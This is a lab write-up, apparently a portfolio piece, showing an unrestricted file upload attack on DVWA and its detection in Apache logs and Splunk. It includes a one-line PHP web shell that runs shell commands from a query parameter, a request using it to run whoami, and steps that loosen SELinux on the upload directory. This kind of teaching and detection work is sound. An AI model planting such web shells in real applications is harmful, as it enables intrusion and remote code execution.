
# File Upload Attack (DVWA)

# Objective

Demonstrate an unrestricted file upload vulnerability using DVWA.

The objective is to show how a vulnerable web application can allow an attacker to upload executable PHP files, resulting in Remote Code Execution (RCE).

The activity was monitored through Apache logs and Splunk.

---

# MITRE ATT&CK Mapping

| Technique | Description |
|-----------|-------------|
| T1190 | Exploit Public-Facing Application |
| T1505.003 | Web Shell |
| T1059 | Command and Scripting Interpreter |

---

# Attack Overview

Unrestricted File Upload vulnerabilities occur when a web application fails to validate uploaded files.

Instead of uploading an image, an attacker uploads a PHP web shell.

If the uploaded file is placed inside a web-accessible directory, the attacker can execute arbitrary commands through the browser.

This vulnerability is commonly used for:

- Remote Code Execution
- Persistence
- Malware deployment
- Privilege escalation
- Web shell installation

---

# Initial Problem

Attempting to upload a PHP file initially produced:

```
Incorrect folder permissions:
/var/www/html/dvwa/hackable/uploads/

Folder is not writable.
```

The upload failed.

![alt text](<Screenshot 2026-07-02 092034.png>)

---

# Investigation

Verified upload directory.

```
ls -ld /var/www/html/dvwa/hackable/uploads
```

Output:

```
drwxr-xr-x
```

Ownership:

```
apache:apache
```

Directory existed correctly.

---

## SELinux Context

Current context:

```
httpd_sys_content_t
```

Meaning:

Apache could read files but could not write to the directory.

---

# Root Cause

SELinux policy prevented Apache from writing into:

```
/var/www/html/dvwa/hackable/uploads
```

Although Linux permissions appeared correct, SELinux denied write access.

This is common on Enterprise Linux systems.

---

# Fix

Changed the SELinux context.

```
sudo semanage fcontext \
-a -t httpd_sys_rw_content_t \
"/var/www/html/dvwa/hackable/uploads(/.*)?"

sudo restorecon -Rv /var/www/html/dvwa/hackable/uploads
```

Verified:

```
ls -ldZ /var/www/html/dvwa/hackable/uploads
```

Output:

```
httpd_sys_rw_content_t
```

---

# Malicious File

Simple PHP web shell.

```php
<?php
system($_GET['cmd']);
?>
```

Saved as:

```
shell.php
```

---

# Upload

DVWA accepted the upload.

Message:

```
../../hackable/uploads/shell.php successfully uploaded!
```

![alt text](<Screenshot 2026-07-02 092921.png>)

---


# Apache Logging

Apache recorded requests made to the uploaded shell.

request:

```
GET /dvwa/hackable/uploads/shell.php?cmd=whoami
```

![alt text](<Screenshot 2026-07-02 094826.png>)

---

# Splunk Detection

search:

```spl
index=main sourcetype=apache_access "/hackable/uploads"
```

![alt text](<Screenshot 2026-07-02 093819.png>)

To detect command execution:

```spl
index=main sourcetype=apache_access "shell.php"
```

![alt text](<Screenshot 2026-07-02 093735.png>)

Timeline:

```spl
index=main sourcetype=apache_access "shell.php"
| timechart count
```

c:\Users\ayoai\OneDrive\Desktop\DevSecOps projects\enterprise-security-monitoring-lab\reports\screenshots\Screenshot 2026-07-02 095111.png

---

# Indicators of Compromise

- PHP files uploaded to web-accessible directories
- Requests to uploaded PHP files
- Unexpected query parameters (cmd=)
- Web server executing system commands
- New executable files under uploads/

---

# Lessons Learned

This exercise highlighted how Linux permissions alone do not determine web server behavior.

Although Apache owned the upload directory, SELinux blocked write access until the directory context was changed to:

```
httpd_sys_rw_content_t
```

The lab also demonstrated how unrestricted file uploads can quickly become Remote Code Execution vulnerabilities if uploaded files are executable.

Monitoring upload directories and web server logs is critical for detecting this attack.

---

# Evidence Collected

- Successful upload message
- Apache access logs
- Splunk search results
- SELinux context before/after
- Web shell execution (`whoami`)
- Uploaded shell location

---

# Skills Demonstrated

- Apache Administration
- Linux File Permissions
- SELinux Troubleshooting
- PHP Web Shell Analysis
- Remote Code Execution
- Apache Log Analysis
- Splunk Investigation
- Threat Detection
- Vulnerability Validation